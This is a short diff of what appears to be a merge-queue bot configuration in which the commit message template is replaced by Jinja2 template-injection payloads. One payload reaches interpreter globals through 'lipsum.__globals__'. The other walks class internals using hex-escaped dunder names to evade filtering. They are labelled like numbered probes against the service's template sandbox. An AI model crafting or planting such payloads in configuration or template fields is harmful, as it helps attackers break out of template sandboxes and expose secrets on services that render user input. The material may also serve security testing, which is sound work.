@@ -5,7 +5,7 @@ queue_rules:
     merge_conditions: []
     merge_method: squash
     commit_message_template: |
-      P2-E6: {% set ns = namespace(g=[lipsum]|map(attribute='__globals__')|list) %}{{ ns.g[0]|pprint }}
+      P2-E4: {% for k in dict['\x5f\x5fclass\x5f\x5f'].mro()[0]['\x5f\x5fdict\x5f\x5f'] %}{{ k|replace('_','-') }}{% endfor %}
 
 pull_request_rules:
   - name: auto-queue
